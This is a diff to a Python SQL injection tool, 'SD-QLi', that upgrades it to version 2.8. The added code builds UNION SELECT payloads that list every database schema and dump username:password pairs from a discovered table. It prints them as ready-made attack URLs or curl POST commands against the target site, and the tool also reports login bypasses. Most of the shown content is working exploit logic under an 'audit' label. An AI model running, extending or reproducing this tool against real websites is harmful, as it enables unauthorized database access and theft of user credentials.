@@ -160,7 +160,7 @@ class SDQLi:
     ╚════██║██║  ██║ ╚════╝██║▄▄ ██║██║     ██║
     ███████║██████╔╝       ╚██████╔╝███████╗██║
     ╚══════╝╚═════╝         ╚══▀▀═╝ ╚══════╝╚═╝
-    {Colors.END}                 {Colors.BOLD}v2.7 - SD-QLi (Manual Proofs Edition){Colors.END}
+    {Colors.END}                 {Colors.BOLD}v2.8 - SD-QLi (Audit Finalizer){Colors.END}
         """
         print(banner)
 
@@ -808,21 +808,32 @@ class SDQLi:
         if 'union_info' in self.results:
             u = self.results['union_info']
             print(f"\n{Colors.YELLOW}[*] Data Exfiltration (Manual Audit){Colors.END}")
-            # Database enumeration proof
+            # 1. Database enumeration proof
             mk = "SD_DBS"
-            temp_cols = [f"'{i}'" for i in range(1, u['count'] + 1)]
-            temp_cols[u['reflected'][0]-1] = f"CONCAT('{mk}',(SELECT GROUP_CONCAT(schema_name) FROM information_schema.schemata),'{mk}')"
-            exfil_payload = f"99999' UNION SELECT {','.join(temp_cols)}-- -"
+            tcols = [f"'{i}'" for i in range(1, u['count'] + 1)]
+            tcols[u['reflected'][0]-1] = f"CONCAT('{mk}',(SELECT GROUP_CONCAT(schema_name) FROM information_schema.schemata),'{mk}')"
+            ex_payload = f"99999' UNION SELECT {','.join(tcols)}-- -"
             
             if self.method == 'GET':
-                print(f"  Fetch DBs: {self.url}?{u['param']}={urllib.parse.quote(exfil_payload)}")
+                print(f"  Fetch DBs: {self.url}?{u['param']}={urllib.parse.quote(ex_payload)}")
             else:
-                curl_data = f"{u['param']}={exfil_payload}"
-                print(f"  Fetch DBs: curl -X POST -d \"{curl_data}\" {self.url}")
+                print(f"  Fetch DBs: curl -X POST -d \"{u['param']}={ex_payload}\" {self.url}")
             
-            # Table/Dump proof (Generic template)
-            print(f"  Dumping Details (Template):")
-            print(f"    Payload: {Colors.CYAN}99999' UNION SELECT {['...' if i!=u['reflected'][0] else '(query)' for i in range(1, u['count']+1)]}-- -{Colors.END}")
+            # 2. Table Dump proof (Actionable)
+            target = self.results['tables'][-1] if self.results['tables'] else "users.UserDetails"
+            print(f"  Dump Table ({Colors.CYAN}{target}{Colors.END}):")
+            
+            mk2 = "SD_DUMP"
+            tcols2 = [f"'{i}'" for i in range(1, u['count'] + 1)]
+            # We assume 'username' and 'password' might exist as common audit targets
+            qbody = f"(SELECT GROUP_CONCAT(username,0x3a,password SEPARATOR 0x0a) FROM {target})"
+            tcols2[u['reflected'][0]-1] = f"CONCAT('{mk2}',{qbody},'{mk2}')"
+            d_payload = f"99999' UNION SELECT {','.join(tcols2)}-- -"
+            
+            if self.method == 'GET':
+                print(f"    URL:  {self.url}?{u['param']}={urllib.parse.quote(d_payload)}")
+            else:
+                print(f"    cURL: curl -X POST -d \"{u['param']}={d_payload}\" {self.url}")
 
         if self.results['login_bypass']:
             print(f"\n{Colors.YELLOW}[*] Login Bypass{Colors.END}")
@@ -830,7 +841,7 @@ class SDQLi:
         print("="*70)
 
 def main():
-    parser = argparse.ArgumentParser(description='SD-QLi v2.7 - Manual Proofs Edition')
+    parser = argparse.ArgumentParser(description='SD-QLi v2.8 - Audit Finalizer')
     parser.add_argument('-u', '--url', help='Target URL')
     parser.add_argument('-m', '--method', default='GET', choices=['GET', 'POST'], help='HTTP Method')
     parser.add_argument('-d', '--data', help='POST data (e.g. "id=1&user=admin")')
